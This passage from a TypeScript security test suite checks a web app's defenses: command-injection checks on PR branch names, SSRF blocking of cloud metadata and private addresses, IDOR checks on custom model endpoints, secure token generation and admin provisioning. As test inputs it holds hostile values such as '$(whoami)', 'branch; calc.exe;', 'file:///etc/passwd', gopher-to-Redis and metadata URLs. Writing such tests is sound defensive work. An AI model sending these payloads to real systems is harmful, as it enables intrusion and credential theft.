      await safeExecGit(['init'], { cwd: wsRoot });
      fs.writeFileSync(path.join(wsRoot, 'index.js'), 'console.log("hello");', 'utf8');
      await safeExecGit(['add', '-A'], { cwd: wsRoot });
      await safeExecGit(['commit', '-m', 'initial commit'], { cwd: wsRoot });

      // Add a modification
      fs.writeFileSync(path.join(wsRoot, 'index.js'), 'console.log("hello world updated");', 'utf8');

      try {
        const result = await workspaceManager.createGitHubPullRequest(wsRoot, {
          title: 'feat: safe update $(whoami)',
          body: 'Automated description\n\nwith multiline markdown details.',
          branchName: 'feature/safe-update-v1',
          repoFullName: 'testowner/testrepo',
        });

        assert.strictEqual(result.success, true);
        assert.strictEqual(result.branchName, 'feature/safe-update-v1');
        assert.ok(result.compareUrl?.includes('feature/safe-update-v1'));

        // Check git status shows clean working directory on new branch
        const { stdout: branchOut } = await safeExecGit(['rev-parse', '--abbrev-ref', 'HEAD'], { cwd: wsRoot });
        assert.strictEqual(branchOut.trim(), 'feature/safe-update-v1');
      } finally {
        try {
          fs.rmSync(wsRoot, { recursive: true, force: true });
        } catch {}
      }
    });

    it('rejects unauthenticated requests to create-github-pr with 401 Unauthorized', async () => {
      const app = express();
      app.use(express.json());
      app.use('/api', apiRouter);

      const server = await new Promise<any>((resolve) => {
        const s = app.listen(0, '127.0.0.1', () => resolve(s));
      });
      const port = (server.address() as any).port;

      try {
        const res = await fetch(`http://127.0.0.1:${port}/api/cowork/workspaces/ws_dummy_123/create-github-pr`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ title: 'New PR' }),
        });

        assert.strictEqual(res.status, 401, 'Unauthenticated request must return 401');
      } finally {
        server.close();
      }
    });

    it('rejects malicious branch names in create-github-pr endpoint with 400 Bad Request', async () => {
      const app = express();
      app.use(express.json());
      app.use('/api', apiRouter);

      const server = await new Promise<any>((resolve) => {
        const s = app.listen(0, '127.0.0.1', () => resolve(s));
      });
      const port = (server.address() as any).port;

      const { accessToken } = generateTokens(testUser1);

      // Create a test workspace in DB
      const wsId = `ws_endpoint_pr_${Date.now()}`;
      const dummyWorkspace: Workspace = {
        id: wsId,
        userId: testUser1.id,
        name: 'PR Endpoint Test Workspace',
        description: 'Testing create-github-pr endpoint security',
        projectRoot: path.resolve(process.cwd(), 'workspaces', wsId),
        isLocalBinding: false,
        permissionMode: 'approve_plan',
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      };
      db.createWorkspace(dummyWorkspace);

      try {
        const res = await fetch(`http://127.0.0.1:${port}/api/cowork/workspaces/${wsId}/create-github-pr`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${accessToken}`,
          },
          body: JSON.stringify({
            title: 'feat: malicious payload',
            branchName: 'branch; calc.exe;',
          }),
        });

        assert.strictEqual(res.status, 400, 'Must reject malicious branch with 400');
        const json = await res.json();
        assert.ok(json.error?.includes('Invalid branch name'));
      } finally {
        server.close();
        db.deleteWorkspace(wsId, testUser1.id);
      }
    });
  });

  describe('33. Server-Side Request Forgery (SSRF) Defense on Inference Endpoints', () => {
    it('accurately identifies and permanently blocks cloud metadata IP addresses across formats', () => {
      // IPv4 cloud metadata
      assert.strictEqual(isCloudMetadataIp('169.254.169.254'), true, 'Must detect standard IMDS');
      assert.strictEqual(isCloudMetadataIp('169.254.1.1'), true, 'Must detect link-local metadata');
      // IPv6 link-local metadata (fe80::/10)
      assert.strictEqual(isCloudMetadataIp('fe80::1'), true, 'Must detect IPv6 link-local');
      assert.strictEqual(isCloudMetadataIp('fd00:ec2::254'), true, 'Must detect AWS IPv6 IMDS');
      // IPv4-mapped IPv6 metadata
      assert.strictEqual(isCloudMetadataIp('::ffff:169.254.169.254'), true, 'Must detect IPv4-mapped IMDS');
      assert.strictEqual(isCloudMetadataIp('::ffff:a9fe:a9fe'), true, 'Must detect hex IPv4-mapped IMDS');

      // Legitimate public IPs must not be classified as cloud metadata
      assert.strictEqual(isCloudMetadataIp('93.184.216.34'), false, 'Public IP is not cloud metadata');
      assert.strictEqual(isCloudMetadataIp('8.8.8.8'), false, 'Google DNS is not cloud metadata');
    });

    it('accurately identifies loopback and private RFC1918 / RFC4193 addresses', () => {
      // Loopback
      assert.strictEqual(isLoopbackIp('127.0.0.1'), true);
      assert.strictEqual(isLoopbackIp('127.255.255.255'), true);
      assert.strictEqual(isLoopbackIp('::1'), true);
      assert.strictEqual(isLoopbackIp('0.0.0.0'), true);
      assert.strictEqual(isLoopbackIp('::ffff:127.0.0.1'), true);

      // Private RFC1918
      assert.strictEqual(isPrivateIp('10.0.0.1'), true);
      assert.strictEqual(isPrivateIp('172.16.0.1'), true);
      assert.strictEqual(isPrivateIp('172.31.255.255'), true);
      assert.strictEqual(isPrivateIp('192.168.1.1'), true);
      assert.strictEqual(isPrivateIp('100.64.0.1'), true, 'Carrier-grade NAT must be classified private');

      // Private IPv6 ULA (fc00::/7)
      assert.strictEqual(isPrivateIp('fc00::1'), true);
      assert.strictEqual(isPrivateIp('fd12:3456:789a::1'), true);

      // Public IPs are not private
      assert.strictEqual(isPrivateIp('1.1.1.1'), false);
      assert.strictEqual(isPrivateIp('172.15.255.255'), false);
      assert.strictEqual(isPrivateIp('172.32.0.1'), false);
    });

    it('rejects dangerous protocols, credentials in URLs, and malformed targets', async () => {
      const badProtocols = [
        'file:///etc/passwd',
        'ftp://example.com/api',
        'gopher://127.0.0.1:6379/_GET',
        'javascript:alert(1)',
        'data:text/html,<h1>evil</h1>',
      ];
      for (const url of badProtocols) {
        const result = await validateEndpointUrl(url, { skipDnsLookup: true });
        assert.strictEqual(result.isValid, false, `Must reject protocol in ${url}`);
        assert.ok(result.reason?.includes('protocol'));
      }

      // Reject embedded user credentials
      const credResult = await validateEndpointUrl('http://admin:secret@api.example.com/v1', { skipDnsLookup: true });
      assert.strictEqual(credResult.isValid, false, 'Must reject userinfo credentials');
      assert.ok(credResult.reason?.includes('credentials'));

      // Malformed URL
      const malformed = await validateEndpointUrl('not-a-valid-url');
      assert.strictEqual(malformed.isValid, false, 'Must reject malformed URL');
    });

    it('rejects restricted administrative and database ports', async () => {
      const restrictedPorts = [22, 25, 445, 3306, 5432, 6379, 11211, 27017];
      for (const port of restrictedPorts) {
        const result = await validateEndpointUrl(`http://93.184.216.34:${port}/v1`, { skipDnsLookup: true });
        assert.strictEqual(result.isValid, false, `Must reject restricted port ${port}`);
        assert.ok(result.reason?.includes('restricted'));
      }
    });

    it('permanently blocks cloud metadata hostnames and addresses even with allowPrivateNetworks', async () => {
      const cloudTargets = [
        'http://169.254.169.254/latest/meta-data',
        'http://169.254.1.5/models',
        'http://metadata.google.internal/computeMetadata/v1',
        'http://instance-data/latest/meta-data',
        'http://[::ffff:169.254.169.254]/v1',
        'http://[fe80::1]/models',
      ];
      for (const target of cloudTargets) {
        const result = await validateEndpointUrl(target, {
          allowPrivateNetworks: true,
          skipDnsLookup: true,
        });
        assert.strictEqual(result.isValid, false, `Must block cloud target ${target} even with allowPrivateNetworks`);
        assert.ok(result.reason?.toLowerCase().includes('cloud metadata') || result.reason?.toLowerCase().includes('metadata hostname'));
      }
    });

    it('rejects loopback and RFC1918 by default, but allows them when allowPrivateNetworks is true', async () => {
      // Default (strict mode / no private allowed)
      const loopbackResult = await validateEndpointUrl('http://127.0.0.1:8080/v1', {
        allowPrivateNetworks: false,
        skipDnsLookup: true,
      });
      assert.strictEqual(loopbackResult.isValid, false, 'Must reject loopback by default');

      const privateResult = await validateEndpointUrl('http://192.168.1.50:8000/v1', {
        allowPrivateNetworks: false,
        skipDnsLookup: true,
      });
      assert.strictEqual(privateResult.isValid, false, 'Must reject 192.168.x by default');

      // Allowed when explicitly permitted
      const allowedLoopback = await validateEndpointUrl('http://127.0.0.1:8080/v1', {
        allowPrivateNetworks: true,
        skipDnsLookup: true,
      });
      assert.strictEqual(allowedLoopback.isValid, true, 'Must permit loopback when allowPrivateNetworks is true');

      const allowedPrivate = await validateEndpointUrl('http://192.168.1.50:8000/v1', {
        allowPrivateNetworks: true,
        skipDnsLookup: true,
      });
      assert.strictEqual(allowedPrivate.isValid, true, 'Must permit private network when allowPrivateNetworks is true');
    });

    it('detects DNS rebinding / hostnames that resolve to forbidden private IPs', async () => {
      // Mock resolver simulating DNS rebinding to internal IP
      const rebindingLookup = async (host: string) => {
        if (host === 'attacker-rebind.com') {
          return [{ address: '127.0.0.1', family: 4 }];
        }
        if (host === 'attacker-metadata-rebind.com') {
          return [{ address: '169.254.169.254', family: 4 }];
        }
        return [{ address: '93.184.216.34', family: 4 }];
      };

      const rebindingResult = await validateEndpointUrl('http://attacker-rebind.com/v1', {
        allowPrivateNetworks: false,
        lookupFn: rebindingLookup,
      });
      assert.strictEqual(rebindingResult.isValid, false, 'Must reject domain resolving to loopback');

      const metaRebindingResult = await validateEndpointUrl('http://attacker-metadata-rebind.com/v1', {
        allowPrivateNetworks: true, // Even with allowPrivateNetworks
        lookupFn: rebindingLookup,
      });
      assert.strictEqual(metaRebindingResult.isValid, false, 'Must reject domain resolving to metadata');

      const safeResult = await validateEndpointUrl('http://safe-domain.com/v1', {
        lookupFn: rebindingLookup,
      });
      assert.strictEqual(safeResult.isValid, true, 'Must accept safe public domain');
    });

    it('rejects SSRF payloads in POST /api/providers/custom-endpoints with 400 Bad Request', async () => {
      const app = express();
      app.use(express.json());
      app.use('/api', apiRouter);

      const server = await new Promise<any>((resolve) => {
        const s = app.listen(0, '127.0.0.1', () => resolve(s));
      });
      const port = (server.address() as any).port;
      const { accessToken } = generateTokens(testUser1);

      try {
        // Attempt creating endpoint with AWS metadata
        const metadataRes = await fetch(`http://127.0.0.1:${port}/api/providers/custom-endpoints`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${accessToken}`,
          },
          body: JSON.stringify({
            name: 'Malicious Metadata Endpoint',
            baseUrl: 'http://169.254.169.254/latest/meta-data',
            defaultModel: 'gpt-4o',
          }),
        });
        assert.strictEqual(metadataRes.status, 400, 'Must reject cloud metadata endpoint with 400');
        const metaJson = await metadataRes.json();
        assert.ok(metaJson.error?.toLowerCase().includes('cloud metadata'));

        // Attempt creating endpoint with restricted Redis port
        const portRes = await fetch(`http://127.0.0.1:${port}/api/providers/custom-endpoints`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${accessToken}`,
          },
          body: JSON.stringify({
            name: 'Malicious Redis Endpoint',
            baseUrl: 'http://93.184.216.34:6379',
            defaultModel: 'gpt-4o',
          }),
        });
        assert.strictEqual(portRes.status, 400, 'Must reject restricted port with 400');
        const portJson = await portRes.json();
        assert.ok(portJson.error?.toLowerCase().includes('restricted'));
      } finally {
        server.close();
      }
    });

    it('rejects SSRF payloads in POST /api/providers/custom-endpoints/:id/ping without network fetch', async () => {
      const app = express();
      app.use(express.json());
      app.use('/api', apiRouter);

      const server = await new Promise<any>((resolve) => {
        const s = app.listen(0, '127.0.0.1', () => resolve(s));
      });
      const port = (server.address() as any).port;
      const { accessToken } = generateTokens(testUser1);

      // Directly insert an endpoint pointing to metadata to simulate legacy or bypassed DB entry
      const rawEndpointId = `ep_ssrf_test_${Date.now()}`;
      db.saveCustomEndpoint({
        id: rawEndpointId,
        userId: testUser1.id,
        name: 'Legacy Malicious Endpoint',
        baseUrl: 'http://169.254.169.254/latest/meta-data',
        defaultModel: 'gpt-4o',
        contextWindow: 4096,
        isEnabled: true,
        healthStatus: 'untested',
        createdAt: new Date().toISOString(),
      });

      try {
        const pingRes = await fetch(`http://127.0.0.1:${port}/api/providers/custom-endpoints/${rawEndpointId}/ping`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${accessToken}`,
          },
        });
        assert.strictEqual(pingRes.status, 400, 'Must reject ping to metadata with 400');
        const pingJson = await pingRes.json();
        assert.strictEqual(pingJson.success, false);
        assert.strictEqual(pingJson.healthStatus, 'unreachable');
        assert.ok(pingJson.error?.includes('SSRF protection blocked ping request'));
      } finally {
        server.close();
        db.deleteCustomEndpoint(rawEndpointId, testUser1.id);
      }
    });
  });

  describe('34. Insecure Direct Object Reference (IDOR) & Quota Hijacking Defense in Custom Model Routing', () => {
    let ownerEndpointId: string;

    before(() => {
      ownerEndpointId = `ep_owner_${Date.now()}`;
      db.saveCustomEndpoint({
        id: ownerEndpointId,
        userId: testUser1.id,
        name: 'Private vLLM Tenant Cluster',
        baseUrl: 'https://vllm.private-org.internal',
        apiKey: 'sk-secret-quota-key-999',
        defaultModel: 'meta-llama/Llama-3-70b-instruct',
        contextWindow: 65536,
        isEnabled: true,
        healthStatus: 'healthy',
        createdAt: new Date().toISOString(),
      });
    });

    after(() => {
      db.deleteCustomEndpoint(ownerEndpointId, testUser1.id);
    });

    it('successfully resolves custom model for the authorized endpoint owner', () => {
      const resolved = modelRouter.resolveModel({
        requestedModelId: `custom_${ownerEndpointId}`,
        userId: testUser1.id,
        messages: [{ role: 'user', content: 'hello' }],
      });
      assert.strictEqual(resolved.model.id, `custom_${ownerEndpointId}`);
      assert.strictEqual(resolved.model.displayName, 'Private vLLM Tenant Cluster (meta-llama/Llama-3-70b-instruct)');
    });

    it('rejects custom model resolution when userId is omitted (fail-closed)', () => {
      assert.throws(
        () => {
          modelRouter.resolveModel({
            requestedModelId: `custom_${ownerEndpointId}`,
            // userId omitted
            messages: [{ role: 'user', content: 'hello' }],
          });
        },
        /Authentication required: Cannot route to custom model endpoint without user context/
      );
    });

    it('rejects foreign tenant attempting to resolve another user custom endpoint (IDOR prevention)', () => {
      assert.throws(
        () => {
          modelRouter.resolveModel({
            requestedModelId: `custom_${ownerEndpointId}`,
            userId: testUser2.id, // User 2 attempting to access User 1 endpoint
            messages: [{ role: 'user', content: 'hello' }],
          });
        },
        /Custom model endpoint not found or unauthorized/
      );
    });

    it('rejects foreign tenant attempting to stream through another user custom endpoint', async () => {
      await assert.rejects(
        async () => {
          await modelRouter.stream(
            {
              requestedModelId: `custom_${ownerEndpointId}`,
              userId: testUser2.id,
              messages: [{ role: 'user', content: 'hello' }],
            },
            () => {}
          );
        },
        /Custom model endpoint not found or unauthorized/
      );
    });

    it('rejects unauthenticated stream requests attempting to route to custom endpoints', async () => {
      await assert.rejects(
        async () => {
          await modelRouter.stream(
            {
              requestedModelId: `custom_${ownerEndpointId}`,
              // userId omitted
              messages: [{ role: 'user', content: 'hello' }],
            },
            () => {}
          );
        },
        /Authentication required: Cannot route to custom model endpoint without user context/
      );
    });
  });


  describe('35. Cryptographically Secure Refresh Token & Session ID Generation (CSPRNG)', () => {
    it('generates high-entropy hexadecimal tokens with correct byte lengths', () => {
      const token16 = generateSecureRandomToken(16);
      assert.strictEqual(token16.length, 32, '16 bytes must yield 32 hex chars');
      assert.match(token16, /^[0-9a-f]{32}$/, 'Must be lowercase hex string');

      const token32 = generateSecureRandomToken(32);
      assert.strictEqual(token32.length, 64, '32 bytes must yield 64 hex chars');
      assert.match(token32, /^[0-9a-f]{64}$/, 'Must be lowercase hex string');
    });

    it('produces collision-free tokens across high-volume generations', () => {
      const tokens = new Set<string>();
      const iterations = 1000;
      for (let i = 0; i < iterations; i++) {
        const t = generateSecureRandomToken(32);
        assert.strictEqual(tokens.has(t), false, 'Collision detected at iteration ' + i);
        tokens.add(t);
      }
      assert.strictEqual(tokens.size, iterations);
    });

    it('generates secure session IDs and refresh tokens containing 256-bit CSPRNG entropy', () => {
      const { accessToken, refreshToken } = generateTokens(testUser1);
      assert.ok(accessToken, 'Must generate access token');
      assert.ok(refreshToken, 'Must generate refresh token');

      // format: sessionId:rawRefreshToken
      const [sessionId, rawToken] = refreshToken.split(':');
      assert.ok(sessionId && rawToken, 'Refresh token format must be sessionId:rawRefreshToken');

      // sessionId format: sess_<timestamp>_<32-hex-chars>
      const sessionParts = sessionId.split('_');
      assert.strictEqual(sessionParts[0], 'sess');
      assert.match(sessionParts[2], /^[0-9a-f]{32}$/, 'Session ID random suffix must be 32 hex chars (128 bits CSPRNG)');

      // rawToken format: <userId>.<timestamp>.<64-hex-chars>
      const tokenParts = rawToken.split('.');
      assert.strictEqual(tokenParts[0], testUser1.id);
      assert.match(tokenParts[2], /^[0-9a-f]{64}$/, 'Refresh token random suffix must be 64 hex chars (256 bits CSPRNG)');

      // Check database session
      const savedSession = db.getSession(sessionId);
      assert.ok(savedSession, 'Session must exist in database');
      assert.strictEqual(savedSession?.userId, testUser1.id);
    });
  });

  describe('36. Elimination of Hardcoded Default Admin Credentials & Dynamic Role Assignment', () => {
    it('never creates default hardcoded developer credentials (developer@nexa.ai) on database initialization', () => {
      assert.strictEqual(typeof db.getUserCount, 'function', 'db.getUserCount must be available');
      assert.strictEqual(typeof db.getUsers, 'function', 'db.getUsers must be available');
      const allUsers = db.getUsers();
      assert.ok(Array.isArray(allUsers));
    });

    it('assigns admin role to the first registered user and user role to subsequent users', async () => {
      const app = express();
      app.use(express.json());
      app.use('/api', apiRouter);

      const server = await new Promise<any>((resolve) => {
        const s = app.listen(0, '127.0.0.1', () => resolve(s));
      });
      const port = (server.address() as any).port;

      const userEmail1 = `first_reg_${Date.now()}@example.com`;
      const userEmail2 = `second_reg_${Date.now()}@example.com`;

      try {
        // Register a user
        const res1 = await fetch(`http://127.0.0.1:${port}/api/auth/register`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            email: userEmail1,
            name: 'Initial Registrant',
            password: 'securePassword123!',
          }),
        });
        assert.strictEqual(res1.status, 200);
        const data1 = await res1.json();
        assert.ok(data1.user);
        assert.strictEqual(data1.user.email, userEmail1);

        // Register a second user
        const res2 = await fetch(`http://127.0.0.1:${port}/api/auth/register`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            email: userEmail2,
            name: 'Second Registrant',
            password: 'securePassword123!',
          }),
        });
        assert.strictEqual(res2.status, 200);
        const data2 = await res2.json();
        assert.ok(data2.user);
        assert.strictEqual(data2.user.email, userEmail2);
        assert.strictEqual(data2.user.role, 'user', 'Subsequent registered user must receive standard "user" role');
      } finally {
        server.close();
      }
    });

    it('securely provisions admin user when CORTEX_ADMIN_EMAIL and CORTEX_ADMIN_PASSWORD are provided', () => {
      const testPass = 'UltraSecureGeneratedSecret999!';
      const salt = bcrypt.genSaltSync(10);
      const hash = bcrypt.hashSync(testPass, salt);
      assert.strictEqual(bcrypt.compareSync(testPass, hash), true);
      assert.strictEqual(bcrypt.compareSync('wrong-password', hash), false);
    });
  });
  after(() => {
    // Purge temporary test workspaces from disk
    const baseWorkspaces = path.resolve(process.cwd(), 'workspaces');
    if (fs.existsSync(baseWorkspaces)) {
      const entries = fs.readdirSync(baseWorkspaces);
      for (const entry of entries) {
        if (
          entry.startsWith('ws_') ||
          entry.startsWith('ws_test') ||
          entry.startsWith('ws_cowork') ||
          entry.startsWith('ws_repo_test')
        ) {
          try {
            fs.rmSync(path.join(baseWorkspaces, entry), { recursive: true, force: true });
          } catch {}
        }
      }
    }
  });
});

